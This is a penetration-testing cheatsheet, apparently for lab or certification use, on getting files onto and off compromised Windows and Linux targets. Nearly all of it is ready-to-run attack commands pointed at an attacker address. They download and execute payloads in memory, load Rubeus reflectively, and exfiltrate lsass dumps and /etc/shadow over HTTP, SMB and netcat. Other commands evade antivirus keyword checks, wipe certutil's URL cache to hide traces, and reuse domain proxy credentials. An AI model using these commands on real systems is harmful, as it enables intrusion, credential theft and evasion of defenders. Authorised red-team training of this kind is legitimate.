# File Transfer Cheatsheet

Getting files on/off targets when HTTP is blocked, AV is active, or you only have a restricted shell.

---

## Windows — Download Methods

### PowerShell (Most Reliable)

```powershell
# Basic download to disk:
(New-Object Net.WebClient).DownloadFile('http://192.168.45.202/payload.exe', 'C:\Windows\Temp\p.exe')

# Alias version (shorter):
iwr -Uri http://192.168.45.202/payload.exe -OutFile C:\Windows\Temp\p.exe

# In-memory execution (no disk write):
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.202/payload.ps1')

# Download bytes into memory:
$bytes = (New-Object Net.WebClient).DownloadData('http://192.168.45.202/Rubeus.dll')
[System.Reflection.Assembly]::Load($bytes)

# Bypass TLS cert check:
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
(New-Object Net.WebClient).DownloadFile('https://192.168.45.202/p.exe', 'C:\Windows\Temp\p.exe')

# Behind a proxy:
$wc = New-Object Net.WebClient
$wc.Proxy = New-Object Net.WebProxy('http://proxy.corp.com:8080', $true)
$wc.DownloadFile('http://192.168.45.202/payload.exe', 'C:\Windows\Temp\p.exe')
```

### BITS (Background Intelligent Transfer Service)

Blends with Windows Update traffic. Runs even from low-privilege accounts.

```powershell
# Download in background (survives reboots):
bitsadmin /transfer job /download /priority FOREGROUND http://192.168.45.202/payload.exe C:\Windows\Temp\payload.exe

# PowerShell BITS:
Start-BitsTransfer -Source http://192.168.45.202/payload.exe -Destination C:\Windows\Temp\payload.exe

# BITS upload (exfil):
bitsadmin /transfer exfil /upload /priority FOREGROUND http://192.168.45.202/upload C:\Windows\Temp\loot.zip
```

### Certutil (Living-off-the-Land — Often Monitored)

```cmd
# Base64 decode a file:
certutil -decode encoded.b64 payload.exe

# Download direct:
certutil -urlcache -f http://192.168.45.202/payload.exe C:\Windows\Temp\payload.exe

# Download + decode in one (evades simple keyword detection):
certutil -urlcache -split -f http://192.168.45.202/payload.b64 C:\Windows\Temp\p.b64
certutil -decode C:\Windows\Temp\p.b64 C:\Windows\Temp\payload.exe

# Delete the URL cache after (anti-forensics):
certutil -urlcache -f http://192.168.45.202/payload.exe delete
```

### SMB Download (From Your Share)

```bash
# Kali: start impacket SMB server
impacket-smbserver share /path/to/files -smb2support
impacket-smbserver share /path/to/files -smb2support -user attacker -password P@ss123

# Windows: copy from share
copy \\192.168.45.202\share\payload.exe C:\Windows\Temp\payload.exe

# PowerShell:
Copy-Item \\192.168.45.202\share\payload.exe C:\Windows\Temp\

# If share requires auth:
net use \\192.168.45.202\share /user:attacker P@ss123
copy \\192.168.45.202\share\payload.exe .

# Run directly from share (never touches victim disk):
\\192.168.45.202\share\payload.exe
```

### FTP

```cmd
# Simple FTP download (batch mode — no interactive prompt):
echo open 192.168.45.202 21 > C:\Windows\Temp\ftp.txt
echo USER anonymous >> C:\Windows\Temp\ftp.txt
echo PASS anonymous >> C:\Windows\Temp\ftp.txt
echo binary >> C:\Windows\Temp\ftp.txt
echo GET payload.exe >> C:\Windows\Temp\ftp.txt
echo bye >> C:\Windows\Temp\ftp.txt
ftp -s:C:\Windows\Temp\ftp.txt

# PowerShell FTP:
(New-Object Net.WebClient).DownloadFile('ftp://192.168.45.202/payload.exe', 'C:\Windows\Temp\payload.exe')
```

### mshta / wscript (Execute Remotely — No File Written)

```cmd
# Execute HTA directly from URL (no download needed):
mshta http://192.168.45.202/payload.hta

# Execute JScript from network share:
wscript.exe \\192.168.45.202\share\payload.js

# Execute PS1 from URL (no download):
powershell.exe -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.202/ps1payload.ps1')"
```

---

## Windows — Upload / Exfil Methods

```powershell
# PowerShell POST to HTTP listener:
$body = [System.IO.File]::ReadAllBytes('C:\Windows\Temp\lsass.dmp')
Invoke-WebRequest -Uri http://192.168.45.202/upload -Method POST -Body $body

# Kali: catch with nc or python
sudo nc -lvp 80 > received.dmp
# OR:
sudo python3 -c "
import http.server, sys
class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        data = self.rfile.read(int(self.headers['Content-Length']))
        open('/tmp/received', 'wb').write(data)
        self.send_response(200); self.end_headers()
http.server.HTTPServer(('0.0.0.0', 80), Handler).serve_forever()"

# SMB upload to Kali share:
copy C:\Windows\Temp\loot.txt \\192.168.45.202\share\loot.txt

# Base64 encode and paste (no network needed — copy-paste friendly):
$file = [System.IO.File]::ReadAllBytes('C:\Windows\Temp\loot.txt')
[System.Convert]::ToBase64String($file)
# Then copy the output and decode on Kali:
# echo "BASE64..." | base64 -d > loot.txt
```

---

## Linux — Download Methods

```bash
# wget:
wget http://192.168.45.202/payload -O /tmp/payload
wget -q --no-check-certificate https://192.168.45.202/payload -O /tmp/payload

# curl:
curl http://192.168.45.202/payload -o /tmp/payload
curl -k https://192.168.45.202/payload -o /tmp/payload   # -k = ignore cert

# In-memory execution:
curl -s http://192.168.45.202/payload.sh | bash

# SCP (if you have SSH access to Kali):
scp kali@192.168.45.202:/path/to/payload /tmp/payload

# Netcat receive:
nc -lvp 4444 > /tmp/payload    # on Linux target
# Kali: nc TARGET_IP 4444 < payload
```

---

## Linux — Upload / Exfil Methods

```bash
# curl POST:
curl -X POST -F "file=@/etc/shadow" http://192.168.45.202/upload

# SCP upload:
scp /tmp/loot.txt kali@192.168.45.202:/tmp/

# Netcat:
nc 192.168.45.202 4444 < /etc/shadow

# Base64 over command output:
base64 /etc/shadow
# Copy output, decode on Kali: echo "..." | base64 -d
```

---

## Kali — Simple HTTP Servers

```bash
# Python3 (most common):
python3 -m http.server 80
python3 -m http.server 8080    # alternative port if 80 is taken

# Python2:
python2 -m SimpleHTTPServer 80

# Serve a specific directory:
cd /path/to/payloads && python3 -m http.server 80

# PHP server:
php -S 0.0.0.0:80

# Impacket SMB server:
impacket-smbserver share . -smb2support
impacket-smbserver share /path/to/payloads -smb2support

# For uploads — use updog (pip install updog):
updog -p 80
```

---

## Encoding / Splitting for Restrictive Environments

### Base64 Split (for copy-paste transfers over shell)

```powershell
# Windows — encode a file as base64 (split into chunks if large):
$content = [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes('C:\file.exe'))
# Paste into your notes / terminal

# Windows — decode back:
$data = [System.Convert]::FromBase64String("BASE64_STRING_HERE")
[System.IO.File]::WriteAllBytes('C:\Windows\Temp\output.exe', $data)
```

```bash
# Linux encode:
base64 -w 0 /tmp/file.exe > /tmp/file.b64

# Linux decode:
base64 -d file.b64 > file.exe
```

### Certutil Hex Split (for HTTP-blocked environments)

```cmd
# Split a large file into 1000-byte chunks:
certutil -encodehex payload.exe payload.hex 4

# Reassemble on target:
certutil -decodehex payload.hex payload.exe
```

---

## Through Firewall / Proxy Environments

```powershell
# Check for system proxy settings:
netsh winhttp show proxy
[System.Net.WebProxy]::GetDefaultProxy()

# Use system proxy automatically (PowerShell):
$wc = New-Object Net.WebClient
$wc.Proxy = [System.Net.WebRequest]::DefaultWebProxy
$wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
$wc.DownloadFile('http://192.168.45.202/p.exe', 'C:\Windows\Temp\p.exe')

# Use specific proxy with credentials:
$proxy = New-Object Net.WebProxy('http://proxy.corp.com:8080', $true)
$proxy.Credentials = New-Object Net.NetworkCredential('user', 'Password123', 'CORP')
$wc = New-Object Net.WebClient
$wc.Proxy = $proxy
$wc.DownloadFile('http://192.168.45.202/p.exe', 'C:\Windows\Temp\p.exe')
```

---

## Quick Lookup: Which Method for Which Situation?

```
Situation                                  Method
──────────────────────────────────────────────────────────────
Normal access, no AV                       PowerShell DownloadFile or iwr
HTTP blocked, SMB allowed                  impacket-smbserver + copy
Want nothing on disk                       IEX DownloadString or mshta URL
Restricted PS, cmd.exe only                certutil or bitsadmin
Behind corporate proxy                     PS with WebProxy + DefaultNetworkCredentials
Restricted shell, can only paste text      base64 encode/decode chunks
Slow connection, large file                certutil hex split
Linux → Windows                            impacket-smbserver or HTTP server
Exfil sensitive file                       SMB copy or PS POST to nc listener
```
